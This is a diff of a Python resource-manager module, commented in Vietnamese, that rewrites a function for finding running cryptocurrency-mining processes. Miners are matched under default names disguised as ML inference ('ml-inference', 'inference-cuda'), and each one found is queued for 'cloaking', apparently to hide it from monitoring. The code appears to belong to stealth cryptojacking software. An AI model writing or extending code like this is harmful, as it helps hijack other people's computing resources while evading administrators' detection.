@@ -20,8 +20,7 @@ from itertools import count
 
 # Các import liên quan đến dự án
 from .utils import MiningProcess
-from .cloak_strategies import CloakStrategyFactory
-from .resource_control import ResourceControlFactory, CPUResourceManager
+from .resource_control import ResourceControlFactory, CPUResourceManager, CloakStrategyFactory
 from .auxiliary_modules.interfaces import IResourceManager
 from .auxiliary_modules.models import ConfigModel
 from .auxiliary_modules.event_bus import EventBus
@@ -485,42 +484,87 @@ class ResourceManager(IResourceManager):
 
     def discover_mining_processes(self):
         """
-        Khám phá các tiến trình "đào" (dựa vào config.processes: 'CPU', 'GPU' ...),
-        và thêm vào self.mining_processes. Gọi 1 lần khi start().
+        Khám phá các tiến trình mining đang chạy.
+        Redesigned theo blueprint: Tập trung hóa trong resource_manager.py
+        với retry mechanism và enhanced detection patterns.
         """
         try:
-            if not self.mining_processes_lock.acquire(timeout=5):
-                self.logger.error("Timeout khi acquire lock discover_mining_processes.")
-                return
+            self.logger.info("Đang khám phá các tiến trình mining...")
+            mining_processes = []
 
-            self.mining_processes.clear()
-
-            cpu_name = self.config.processes.get('CPU', '').lower()
-            gpu_name = self.config.processes.get('GPU', '').lower()
-
-            for proc in psutil.process_iter(['pid', 'name']):
+            # Lấy các tiến trình từ cấu hình
+            cpu_process_name = self.config.processes.get("CPU", "ml-inference")
+            gpu_process_name = self.config.processes.get("GPU", "inference-cuda")
+            
+            # Tìm các tiến trình đang chạy với retry mechanism
+            max_retries = 3
+            for attempt in range(max_retries):
                 try:
-                    pname = proc.info['name'].lower()
-                    if cpu_name in pname or gpu_name in pname:
-                        prio = self.get_process_priority(proc.info['name'])
-                        net_if = self.config.network_interface
-                        mproc = MiningProcess(proc.info['pid'], proc.info['name'], prio, net_if, self.logger)
-                        self.mining_processes.append(mproc)
+                    if not self.mining_processes_lock.acquire(timeout=5):
+                        self.logger.error("Timeout khi acquire lock discover_mining_processes.")
+                        continue
 
-                        if mproc.pid not in self.process_states:
-                            self.process_states[mproc.pid] = "normal"
-
-                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
-                    continue
-
-            self.logger.info(f"Khám phá {len(self.mining_processes)} tiến trình khai thác.")
+                    self.mining_processes.clear()
+                    
+                    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
+                        try:
+                            process_name = proc.info['name']
+                            cmdline = proc.info['cmdline']
+                            cmdline_str = " ".join(cmdline) if cmdline else ""
+                            mining_process = None
+                            
+                            # Phát hiện CPU mining processes
+                            if cpu_process_name in process_name or cpu_process_name in cmdline_str:
+                                self.logger.info(f"Đã phát hiện CPU mining process: {process_name} (PID={proc.info['pid']})")
+                                prio = self.get_process_priority(process_name)
+                                net_if = self.config.network_interface
+                                mining_process = MiningProcess(proc.info['pid'], process_name, prio, net_if, self.logger)
+                                mining_processes.append(mining_process)
+                                self.mining_processes.append(mining_process)
+                                self.enqueue_cloaking(mining_process)
+                            
+                            # Phát hiện GPU mining processes
+                            elif gpu_process_name in process_name or gpu_process_name in cmdline_str:
+                                self.logger.info(f"Đã phát hiện GPU mining process: {process_name} (PID={proc.info['pid']})")
+                                prio = self.get_process_priority(process_name)
+                                net_if = self.config.network_interface
+                                mining_process = MiningProcess(proc.info['pid'], process_name, prio, net_if, self.logger)
+                                # Đánh dấu đây là GPU process
+                                mining_process._is_gpu = True
+                                mining_processes.append(mining_process)
+                                self.mining_processes.append(mining_process)
+                                self.enqueue_cloaking(mining_process)
+                            
+                            # Cập nhật process states
+                            if mining_process and mining_process.pid not in self.process_states:
+                                self.process_states[mining_process.pid] = "normal"
+                            
+                        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                            continue
+                    
+                    self.logger.info(f"Đã phát hiện {len(mining_processes)} tiến trình mining.")
+                    self.mining_processes_lock.release()
+                    return mining_processes
+                    
+                except Exception as e:
+                    if attempt < max_retries - 1:
+                        self.logger.warning(f"Lỗi khi khám phá tiến trình (lần {attempt + 1}): {e}")
+                        time.sleep(2)  # Backoff delay
+                        continue
+                    else:
+                        raise
+                finally:
+                    try:
+                        self.mining_processes_lock.release()
+                    except RuntimeError:
+                        pass
+            
+            self.logger.error("Hết số lần retry, trả về danh sách rỗng")
+            return []
+            
         except Exception as e:
-            self.logger.error(f"Lỗi discover_mining_processes: {e}\n{traceback.format_exc()}")
-        finally:
-            try:
-                self.mining_processes_lock.release()
-            except RuntimeError:
-                pass
+            self.logger.error(f"Lỗi khi khám phá tiến trình: {e}\n{traceback.format_exc()}")
+            return []
 
     def get_process_priority(self, process_name: str) -> int:
         priority_map = self.config.process_priority_map
